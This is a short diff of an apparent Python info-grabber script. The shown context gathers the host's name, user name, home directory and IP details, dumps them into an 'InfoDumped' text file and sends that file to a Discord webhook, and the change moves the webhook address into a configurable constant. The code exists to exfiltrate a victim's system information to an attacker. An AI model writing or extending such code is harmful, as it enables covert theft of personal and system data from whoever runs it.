@@ -33,6 +33,7 @@ IFCONFIG = "https://ifconfig.me/all.json"
 HOSTNAME = socket.gethostname()
 USERNAME = getpass.getuser()
 HOMEDIR = os.path.expanduser("~")
+WEBHOOKURL = "webhook url here"
 
 r = requests.get(url = IPLINK)
 data = r.json()
@@ -82,7 +83,7 @@ from dhooks import Webhook, File
 from io import BytesIO
 import requests
 
-hook = Webhook('webhook here')
+hook = Webhook(WEBHOOKURL)
 
 file = File(f'{dir_path}\InfoDumped{USERNAME}.txt', name=f'InfoDumped{USERNAME}.txt')
 
